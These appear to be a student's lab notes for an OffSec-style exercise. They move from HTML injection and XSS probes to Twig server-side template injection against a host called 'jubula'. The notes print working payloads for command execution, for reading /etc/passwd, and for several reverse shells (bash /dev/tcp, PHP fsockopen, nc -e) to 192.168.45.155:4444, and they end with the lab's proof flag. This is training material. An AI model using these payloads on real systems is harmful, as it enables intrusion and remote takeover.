
potential field to test 
![[Pasted image 20241119170105.png]]
navigate to manage posts to see
![[Pasted image 20241119170132.png]]
see test
![[Pasted image 20241119170150.png]]
when attempting to `delete` it doesn't get deleted, the in burpsuite shows a new field `delete` & `postNumber`
![[Pasted image 20241119170346.png]]



-----

#### `<h1>offsec</h1>` payload test
submitting this `<h1>offsec</h1>` crashes the website and doesn't get uploaded
![[Pasted image 20241119170616.png]]
fails to get a `200` success
![[Pasted image 20241119170725.png]]

-----

#### `<script>alert(0)</script>` payload

submitting this payload doesnt render on the screen but renders in burpsuite, maybe another xss?

![[Pasted image 20241119170907.png]]
doesn't render could mean `innerHTML` is active - especially since the `h1` tag payload crashed the website
![[Pasted image 20241119170934.png]]
`innerHTML` identified in `SOURCES`
![[Pasted image 20241119171218.png]]payloads to test `innerHTML` with

#### Payload Cheatsheet:
```html
<h1>offsec</h1> - used for initial HTML injection
```

```js
<script>alert(0)</script> - used to display alerts
<img src='x' onerror='alert(1)'> - used to bypass innerHTML (found in network packets) and allow scripts
```
testing payload crashed again
![[Pasted image 20241119171345.png]]
what crash looks like in `burpsuite`
![[Pasted image 20241119171406.png]]
peaked at `discord` and got tipped of `SSTI`

----------
#### SSTI testing

`{{5*5}}` payload to test for `twig` a `PHP` template
![[Pasted image 20241119174435.png]]
to make sure it worked navigate to original `http://jubula` endpoint
![[Pasted image 20241119174607.png]]
since it processed, that means its `php` according to [[11.1 - 11.2 Templating Engines]]
![[Pasted image 20241119174647.png]]

testing `command injection` payload for `twig` found in [[11.2 - 11.2.2 Twig - Discovery and Exploitation]]
`{{[0]|reduce('system','id')}}`
![[Pasted image 20241119180050.png]]
shows who we are `www-data` on base `http://jubula` page
![[Pasted image 20241119180133.png]]
going to try to get a revers shell
didnt work
```bash
{{[0]|reduce('system',"bash -c 'bash -i >& /dev/tcp/192.168.45.155/4444 0>&1'")}}
```
need to retest
```php
php -r '$sock=fsockopen("192.168.45.155",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```



Upon entering this `twig` script with the `passthru` function we get the flag
```twig
{{ ['passthru("cat $IFS/etc/passwd")']|filter('system') }}
```
![[Pasted image 20241121091702.png]]
maybe used to get a revshell - didnt work
```twig
{{ ['passthru("bash -c \'bash -i >& /dev/tcp/192.168.45.155/4444 0>&1\'")']|filter('system') }}
```
didnt work
```twig
{{ [0]|reduce('system', 'bash -c "bash -i >& /dev/tcp/192.168.45.155/4444 0>&1"') }}
```
checking to see if `netcat` exists on the system
```twig
{{[0]|reduce('system','which nc')}}
```
![[Pasted image 20241121092659.png]]
reverse shell payload
```twig
{{ [0]|reduce('system', 'nc -e /bin/bash 192.168.45.155 4444') }}
```
where the payload was submitted
![[Pasted image 20241121093830.png]]
upon submission, while the `reverse shell` is active the website refuses to load
![[Pasted image 20241121093747.png]]
`proof.txt: 8d9c80f48b4fe346b7a0e6578646576f`
![[Pasted image 20241121093422.png]]